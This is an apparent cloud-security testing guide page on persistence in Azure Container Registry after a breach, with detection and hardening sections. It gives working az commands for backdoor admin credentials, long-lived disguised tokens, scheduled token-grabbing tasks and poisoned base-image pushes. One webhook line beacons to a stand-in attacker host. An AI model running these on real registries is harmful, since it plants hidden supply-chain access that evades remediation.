---
cstg_id: CSTG-AZURE-CONTAINER-REGISTRY-PERSIST
title: "AZURE Container Registry - Persistence"
provider: azure
service: container-registry
phase: persistence
required_access: assumed-breach
required_permissions:
  - Microsoft.ContainerRegistry/registries/update/write
  - Microsoft.ContainerRegistry/registries/listCredentials/action
  - Microsoft.ContainerRegistry/registries/tokens/write
  - Microsoft.ContainerRegistry/registries/scopeMaps/write
  - Microsoft.ContainerRegistry/registries/generateCredentials/action
  - Microsoft.ContainerRegistry/registries/webhooks/write
  - Microsoft.ContainerRegistry/registries/tasks/write
  - Microsoft.ContainerRegistry/registries/push/write
references:
  - https://learn.microsoft.com/en-us/azure/container-registry/container-registry-authentication
  - https://learn.microsoft.com/en-us/azure/container-registry/container-registry-repository-scoped-permissions
  - https://learn.microsoft.com/en-us/azure/container-registry/container-registry-webhook
  - https://learn.microsoft.com/en-us/azure/container-registry/container-registry-tasks-overview
  - https://learn.microsoft.com/en-us/azure/container-registry/container-registry-tasks-base-images
  - https://hackingthe.cloud/azure/
license: CC BY-SA 4.0
---

## Summary

Persistence in Azure Container Registry (ACR) means retaining durable access to
the registry, or to the workloads that consume it, in a way that survives
credential rotation, account remediation, and routine review. ACR offers several
durable footholds:

- **Identity-detached credentials** — the static admin user and scope-map tokens
  authenticate without an Entra ID principal, so they are unaffected by disabling
  or resetting a user/service-principal account.
- **Backdoored images and poisoned base images** — code embedded in an image (or
  in a base image that many builds inherit) re-executes every time a consumer
  pulls and runs it, re-establishing access after eviction.
- **Automation footholds** — ACR Tasks (including base-image-update triggers and
  scheduled tasks) and webhooks fire on registry events and can re-deliver
  payloads or beacon to attacker infrastructure.

Because these mechanisms operate on the registry rather than on the compromised
identity, they are frequently missed during incident response. This page
catalogs the techniques and how to detect and remove them.

## Prerequisites

- An assumed-breach foothold with one or more of: registry `update/write`
  (admin user, anonymous pull, policies), `listCredentials`/`generateCredentials`,
  `tokens/write` + `scopeMaps/write`, `webhooks/write`, `tasks/write`, or
  `push/write`.
- Knowledge of which images/tags privileged consumers pull and which base images
  builds depend on (from [enumeration](../02-services/azure-container-registry-enum.md)).

## Enumeration

Confirm current persistence-relevant state:

```bash
az acr show -n <registry> --query "{admin:adminUserEnabled, anon:properties.anonymousPullEnabled, identity:identity}" -o json
az acr token list      -r <registry> -o table
az acr scope-map list  -r <registry> -o table
az acr webhook list    -r <registry> -o table
az acr task list       -r <registry> -o table
```

## Misconfigurations & Findings

- Admin user left enabled or re-enabled, providing shared static credentials.
- Long-lived scope-map tokens with no expiry and broad repository scopes.
- Base-image-update tasks or scheduled tasks bound to a managed identity.
- Webhooks pointing at external endpoints, optionally carrying secret headers.
- Anonymous pull enabled, allowing credential-free access.
- Backdoored images on mutable tags consumed by privileged runtimes.

## Exploitation

### update/write + listCredentials (admin user as a static backdoor)

Enable the admin user and harvest both passwords. These credentials are not tied
to any identity, work from anywhere, and persist until the admin user is disabled
and credentials are rotated.

```bash
az acr update -n <registry> --admin-enabled true
az acr credential show -n <registry> -o json     # username + password + password2
# durable login:
docker login <registry>.azurecr.io -u <username> -p <password2>
```

Using `password2` (the secondary password) is a common stealth choice because
operators often rotate only the primary.

### tokens/write + scopeMaps/write (long-lived scoped tokens)

Create a scope map and a token with a far-future (or no) expiry. The token is a
standalone credential surviving Entra ID account changes.

```bash
az acr scope-map create -r <registry> -n maint \
  --repository '*' content/read content/write metadata/read
az acr token create -r <registry> -n maint --scope-map maint
# generate a long-lived password
az acr token credential generate -r <registry> -n maint --password1 \
  --expiration-in-days 3650 -o json
```

Naming tokens to resemble legitimate automation (`ci`, `aks-pull`, `backup`)
reduces the chance of removal.

### generateCredentials (rotate-resistant token passwords)

For any existing token, generate an additional password without deleting the
others, giving a second valid secret that persists through partial rotation:

```bash
az acr token credential generate -r <registry> -n <existingToken> --password2 \
  --expiration-in-days 3650 -o json
```

### tasks/write (automation re-execution and base-image triggers)

Create a scheduled or trigger-based ACR Task that re-runs periodically or on
registry events, executing under a managed identity. This re-establishes access
even after the original foothold is cleaned.

```bash
# Scheduled task that beacons / re-pulls a payload on a timer
az acr task create -r <registry> -n heartbeat \
  --assign-identity <userAssignedIdentityResourceId> \
  --schedule "0 */6 * * *" \
  --cmd 'mcr.microsoft.com/azure-cli az account get-access-token' \
  --context /dev/null

# Base-image-update trigger: task re-runs whenever a referenced base image changes,
# rebuilding (and re-poisoning) a consumed image automatically
az acr task create -r <registry> -n rebuild \
  --context <git-or-storage-context> --file Dockerfile \
  --image app:latest --base-image-trigger-enabled true
```

### push/write (backdoored and poisoned base images)

Re-push a backdoored image to a consumed tag, or poison a widely-inherited base
image so that all downstream builds re-introduce the payload. With mutable tags
and no signature verification, the payload returns on the next pull/build cycle.

```bash
docker tag evil:latest <registry>.azurecr.io/<base-or-app>:<tag>
docker push <registry>.azurecr.io/<base-or-app>:<tag>
```

### webhooks/write (event-driven beacon)

Register a webhook that fires on push/delete events to an attacker-controlled
endpoint, optionally with secret-bearing custom headers. This provides
visibility into registry activity and a covert channel that persists with the
registry resource.

```bash
az acr webhook create -r <registry> -n monitor \
  --uri https://attacker.example/hook \
  --actions push delete \
  --headers "Authorization=Bearer <token>"
```

### update/write (anonymous pull)

Enabling anonymous pull turns the registry into a credential-free access point,
a low-noise persistence primitive on Standard/Premium SKUs:

```bash
az acr update -n <registry> --anonymous-pull-enabled true
```

## Detection & Logging

- **Azure Activity Logs:** `registries/update/write` (admin-user / anonymous-pull
  toggles, policy changes), `registries/listCredentials/action`,
  `registries/generateCredentials/action`, `registries/tokens/write`,
  `registries/scopeMaps/write`, `registries/webhooks/write`,
  `registries/tasks/write`, and `registries/credentials/regenerate/action`.
- **ACR diagnostic logs:** new tokens authenticating
  (`ContainerRegistryLoginEvents`), pushes to protected tags and unexpected task
  runs (`ContainerRegistryRepositoryEvents`).
- **Entra ID audit/sign-in logs:** token issuance to task/registry managed
  identities, especially on a schedule.
- **Configuration drift:** periodically diff registry config (admin-user state,
  anonymous pull, scope maps, tokens, webhooks, tasks) against an approved
  baseline; any unreviewed token/webhook/task is suspect.

## Remediation & Hardening

- Disable the admin user and anonymous pull; enforce with Azure Policy and alert
  on re-enablement.
- Inventory and remove unrecognized scope maps and tokens; require short
  expiries and rotate token passwords on a schedule; regenerate after any
  suspected compromise (which invalidates attacker-held passwords).
- Audit ACR Tasks for scheduled/base-image triggers and unexpected managed-identity
  assignments; remove unknown tasks.
- Review webhooks for external/unknown endpoints and secret-bearing headers.
- Enforce immutable tags, content trust/signature verification, and consumer-side
  digest pinning so backdoored or poisoned base images are not pulled.
- Centralize ACR diagnostic and Activity logs and alert on credential listing,
  token/webhook/task creation, and admin/anonymous toggles.

## Tools

- Azure CLI (`az acr`) — admin user, tokens, scope maps, webhooks, tasks.
- Azure REST / ARM API — scripted persistence and baseline diffing.
- Docker / OCI clients, `crane`, `skopeo` — image and base-image manipulation.

## References

- ACR authentication options — https://learn.microsoft.com/en-us/azure/container-registry/container-registry-authentication
- Repository-scoped tokens/scope maps — https://learn.microsoft.com/en-us/azure/container-registry/container-registry-repository-scoped-permissions
- ACR webhooks — https://learn.microsoft.com/en-us/azure/container-registry/container-registry-webhook
- ACR Tasks overview — https://learn.microsoft.com/en-us/azure/container-registry/container-registry-tasks-overview
- ACR base-image updates — https://learn.microsoft.com/en-us/azure/container-registry/container-registry-tasks-base-images
- hackingthe.cloud (Azure) — https://hackingthe.cloud/azure/

See also: [Container Registry - Enumeration](../02-services/azure-container-registry-enum.md) and [Container Registry - Privilege Escalation](../03-privilege-escalation/azure-container-registry-privesc.md).
